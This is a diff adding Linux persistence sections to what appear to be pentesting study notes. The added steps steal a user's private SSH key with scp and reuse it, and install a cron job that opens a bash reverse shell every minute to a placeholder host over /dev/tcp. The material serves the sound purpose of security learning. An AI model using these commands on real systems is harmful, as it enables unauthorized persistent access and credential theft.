@@ -1531,10 +1531,25 @@ With an anonymous null session you can access the IPC$ share and interact with s
     
     ## Linux Persistence
     ### Persistence via SSH Keys
+    - Linux Servers are typically accessed via ssh
+    - In most cases, Linux servers will have key-based authentication enabled and we can use that key to access thy system.
+    - Even if the user-account password is changed and you have the private key, you'll still be able to logon.
+    - in the users home folder there is a .ssh folder. Here are the keys stored. We'll need to copy the private key.
+    - For this, we can use scp. From the source machine, establish a connection: "scp felix@x.x.x.x:~/.ssh/id_rsa ."
+    - If done, we can use the following ssh command to connect back with a certificate
+      - ssh -i id_rsa felix@x.x.x.x
+    - You'll maybe need to adjust the permissions if they are too open (for example to 600 -> chmod 600 id_rsa)
+  
+  
+    - Typically, you would create a keypair and upload the public key to the target and keep the private key on the hackers machine.
     
-  
-  
-  
+    ### Persistence via Cron Jobs
+    - Cron is a time-based service that runs applications, scripts and other commands at a fixed interval.
+    - Linux equivilent to Windows Sheduled Tasks
+    - cat /etc/cron* -> enumerate the CronJobs
+    - Create a cron-file: echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1'" > cron
+    - Add the Cronjob crontab -i cron
+    - Check if added: crontab -l
   
   
   
